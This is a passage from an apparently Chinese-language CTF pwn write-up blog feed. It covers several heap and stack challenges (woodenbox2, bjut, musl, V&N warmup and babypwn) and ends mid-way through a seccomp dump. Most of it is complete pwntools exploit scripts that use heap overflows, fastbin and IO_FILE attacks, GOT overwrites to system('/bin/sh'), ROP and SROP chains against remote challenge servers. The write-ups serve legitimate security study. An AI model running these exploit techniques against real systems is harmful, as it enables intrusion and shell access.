class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    choice(3)</span><br><span class="line">    io.sendlineafter(&apos;modified?\n&apos;,str(idx))</span><br><span class="line">    io.sendafter(&apos;message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line"># ------------------------------------------------</span><br><span class="line">onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">chunk_list=0x6020C0</span><br><span class="line"># ------------------------------------------------</span><br><span class="line">add(0x18,0x18 * &quot;\x10&quot;) #0</span><br><span class="line">add(0x18,0x18 * &quot;\x11&quot;) #1</span><br><span class="line">dele(0)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">add(0x18,0x18 * &apos;\x12&apos;) #2</span><br><span class="line">edit(1,p64(0) + p64(0x18) + p64(chunk_list))</span><br><span class="line">edit(2,p64(chunk_list + 8) + p64(chunk_list))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;__libc_start_main&apos;]) + p64(chunk_list + 0x30) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;free&apos;]))</span><br><span class="line"></span><br><span class="line">edit(2,p64(elf.plt[&apos;puts&apos;]))</span><br><span class="line">dele(4)</span><br><span class="line">__libc_start_main = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc = __libc_start_main - lib.symbols[b&apos;__libc_start_main&apos;]</span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[&apos;system&apos;]</span><br><span class="line">binsh = lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">__dele_hook = lib.symbols[&apos;__free_hook&apos;]</span><br><span class="line">__malloc_hook = lib.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">__realloc_hook = lib.symbols[&apos;__realloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(5,p64(system))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(binsh))</span><br><span class="line">dele(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h2><p>got表可写，其余保护全开</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>change_item()函数里面没有对size做限制，堆溢出。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目难点在于没有输出功能，需要打io_file泄露libc基址。然后fastbin attack 打malloc_hook,这里onegadget失效，用realloc 调整偏移即可。<br>iofile泄露原理可参考EX师傅博客<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>成功率 16分之一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    try:</span><br><span class="line">        if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">        io=process(&apos;./woodenbox2&apos;)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">        else:</span><br><span class="line">        io=remote(&apos;121.36.215.224&apos;,9998)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">        elf=ELF(&apos;./woodenbox2&apos;)</span><br><span class="line"></span><br><span class="line">        def choice(idx):</span><br><span class="line">            io.sendlineafter(&apos;Your choice:&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def add(size, content):</span><br><span class="line">            choice(1)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;, str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        def free(idx):</span><br><span class="line">        choice(3)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">        def edit(idx,size, content):</span><br><span class="line">            choice(2)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line">        iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157</span><br><span class="line">        onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line"></span><br><span class="line">        add(0x20,&apos;aaaa&apos;)#0</span><br><span class="line">        add(0x40,&apos;aaaa&apos;)#1</span><br><span class="line">        add(0x60,&apos;aaaa&apos;)#2</span><br><span class="line">        add(0xa0,&apos;aaaa&apos;)#3</span><br><span class="line"></span><br><span class="line">        edit(0,0x40,&apos;a&apos;*0x20+p64(0)+p64(0xc1))</span><br><span class="line">        free(1) #1</span><br><span class="line">        free(1) #2</span><br><span class="line">        add(0x40,&apos;bbbb&apos;) #0</span><br><span class="line">        edit(0,0x60,&apos;a&apos;*0x40+p64(0)+p64(0x71)+p16(iofile_off[0]))</span><br><span class="line">        add(0x60,&apos;aaaa&apos;) # 2</span><br><span class="line">        add(0x60,&apos;aaa&apos;+p64(0)*6+p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) #3</span><br><span class="line">        io.recv(0x40)</span><br><span class="line">        leak=u64(io.recv(8))</span><br><span class="line">        info(hex(leak))</span><br><span class="line">        libc.address = leak-(0x7f35bc64a600-0x7f35bc285000)</span><br><span class="line">        log.success(hex(libc.address))</span><br><span class="line">        malloc_hook = libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">        free_hook = libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">        one = libc.address+onegadgets[1]</span><br><span class="line">        log.success(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">        add(0x60,&apos;cccc&apos;)#4</span><br><span class="line">        add(0x60,&apos;dddd&apos;)#5</span><br><span class="line">        free(5)</span><br><span class="line">        edit(0,0x100,0xa0*&apos;\x17&apos;+p64(0)+p64(0x71)+p64(malloc_hook-0x23))</span><br><span class="line">        add(0x60,&apos;bbbb&apos;)</span><br><span class="line">        add(0x60,&apos;d&apos;*0xb+p64(one)+p64(libc.symbols[&quot;realloc&quot;]+13))</span><br><span class="line">        choice(1)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;, str(60))</span><br><span class="line">        io.interactive()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p><h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>got表可写，pie没开</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>show 和 edit功能，可以输入负数，造成数组上溢。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;The index of your hw:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;= 15 &amp;&amp; qword_404140[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Input your hw:&quot;);</span><br><span class="line">    read(0, qword_404140[v1], dword_4040E0[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过数组上溢泄露free_got内容，然后修改 free_got为system，然后释放/bin/sh的堆块</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>做这个题的时候当时是蒙的，使用的是musl libc跟平时的glibc有很大差异。其中最大的差异是muls不支持延迟绑定，没有 malloc_hook等<br>具体参考 <a href="https://my.oschina.net/u/2306127/blog/1592004" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/1592004</a></p><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>add功能有一次堆溢出的机会</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>溢出修改size然后free造成overlapping<br>free时检查了in_use和下一个chunk的prev_size，提前伪造好prev_size<br>overlapping后再取出来，可以uaf，free chunk的链表头部在libc，uaf之后show泄露libc地址，然后edit把fd和bk改为0x602030，利用双向链表写fd bk的操作把一个堆地址写入0x602040，将heap_store劫持到堆上，实现任意地址读写<br>show和edit的次数有限制，但是可以通过任意地址读写覆盖计数器<br>got plt都不可写，没有hook<br>可以通过任意地址读写改写栈，getshell<br>利用任意地址读，读libc中的environ泄露栈地址，算出栈顶地址，然后利用任意地址写覆盖返回地址</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">r=process([&apos;./libc.so&apos;,&apos;./carbon&apos;])</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line">else:</span><br><span class="line">r=remote(&apos;119.3.158.103&apos;,19008)</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;wdnmd&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def gg_add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;Y\x00&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;2&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;3&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;4&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">heap_store = 0x602030</span><br><span class="line">#add-symbol-file libc.so 0x8000000</span><br><span class="line">#x/64gx 0x82953b0</span><br><span class="line">#x/20gx 0x00007fffff7e0000</span><br><span class="line">add(0x10,&apos;gg&apos;)#0</span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x50,p64(0)*6+p64(0x81)+p64(0xa1))#2</span><br><span class="line">add(0x40,&apos;gg&apos;)#3</span><br><span class="line">add(0x20,&apos;gg&apos;)#4</span><br><span class="line">add(0x20,p64(0x40)+p64(heap_store))#5</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">gg_add(0x10,&apos;a&apos;*0x10+p64(0x21)+p64(0x81))#0</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x30,&apos;gg&apos;)#2 6</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">show(6)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(hex(leak))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">libc_base = leak-0x292ad8</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">edit(6,p64(heap_store)*2)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">add(0x30,p64(heap_store))#pwn</span><br><span class="line">environ = libc_base+0x294FD8</span><br><span class="line">log.success(hex(environ))</span><br><span class="line"></span><br><span class="line">add(0x60,p64(0x71)+p64(environ)+p64(0x71)+p64(libc_base+0x8295570-0x8000000))# environ 9 </span><br><span class="line">edit(5,p64(0))</span><br><span class="line">show(9)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">stack_rsp = leak-0x118</span><br><span class="line">log.success(hex(stack_rsp))</span><br><span class="line">#gg_stack = 0x7ffffffee638</span><br><span class="line">#print(hex(gg_stack-stack_rsp))</span><br><span class="line">gg_stack = 0xa0+stack_rsp</span><br><span class="line">binsh = libc.search(&apos;/bin/sh\x00&apos;).next()+libc_base</span><br><span class="line">edit(10,p64(0x71)+p64(gg_stack)+&apos;/bin/sh&apos;.ljust(8,&apos;\x00&apos;)+p64(0)+p64(0x41)+p64(binsh))</span><br><span class="line">edit(5,p64(0))</span><br><span class="line">#show(12) test libc_addr</span><br><span class="line">pause()</span><br><span class="line">menu = 0x400c2f</span><br><span class="line">flag = libc_base+0x8295580-0x8000000</span><br><span class="line">pop_rdi_ret = libc_base+0x14862</span><br><span class="line">pop_rsi_ret = libc_base+0x1c237</span><br><span class="line">pop_rdx_ret = libc_base+0x1b92</span><br><span class="line"></span><br><span class="line">puts_addr = libc_base+libc.sym[&apos;puts&apos;]</span><br><span class="line">#edit(10,p64(menu)*10)</span><br><span class="line">edit(10,p64(menu)+p64(pop_rdi_ret)+p64(flag)+p64(system)+p64(menu))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easyheap&quot;&gt;&lt;a href=&quot;#easyheap&quot; class=&quot;headerlink&quot; title=&quot;easyheap&quot;&gt;&lt;/a&gt;easyheap&lt;/h2&gt;&lt;p&gt;程序没开PIE，got表可写&lt;/p&gt;
&lt;h3 id=&quot;漏洞点&quot;&gt;&lt;a href=&quot;#漏洞点&quot;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N招新赛writeup</title>
    <link href="https://nocbtm.github.io/2020/03/02/V&amp;N%E6%8B%9B%E6%96%B0%E8%B5%9Bwriteup/"/>
    <id>https://nocbtm.github.io/2020/03/02/V&amp;N招新赛writeup/</id>
    <published>2020-03-02T08:47:00.000Z</published>
    <updated>2020-04-23T04:00:50.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="V-amp-N招新赛writeup"><a href="#V-amp-N招新赛writeup" class="headerlink" title="V&amp;N招新赛writeup"></a>V&amp;N招新赛writeup</h1><p>参考链接:<a href="https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/" target="_blank" rel="noopener">https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/</a></p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>题目首先给了puts函数的地址，可得出libc基址，比赛的时候老想着用栈迁移，但stack_addr是随机的，难度比较大。赛后看了小蓝师傅的博客，又学到了新姿势，返回地址覆盖成ret之后，执行两次ret，刚好返回到第一次输入的地方。然后进行ROP，这题用了prtctl函数把execve禁了，可以用open(flag),read(flag,libc_addr+0x3C6500,0x40),write(1,flag,0x40)获取到flag</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52275</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"gift: 0x"</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">info(hex(puts_addr))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">libc_addr=puts_addr-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info(hex(libc_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'Input something: '</span>)</span><br><span class="line">pop_rdi=<span class="number">0x21102</span></span><br><span class="line">pop_rsi=<span class="number">0x202e8</span></span><br><span class="line">pop_rax=<span class="number">0x33544</span></span><br><span class="line">pop_rdx=<span class="number">0x1b92</span></span><br><span class="line">syscall_ret=<span class="number">0xbc375</span></span><br><span class="line">ret=<span class="number">0x937</span></span><br><span class="line">payload = p64(libc_addr+pop_rdi)+p64(<span class="number">0</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rsi)+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">'open'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">3</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">1</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'write'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name?'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(libc_addr+ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">'flag\x00\x00\n'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>SROP参考:<a href="https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop</a><br>这道题还是借鉴小蓝师傅的做法<br>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./vn_pwn_babypwn_1 </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0d</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) goto <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) goto <span class="number">0015</span></span><br><span class="line"> <span 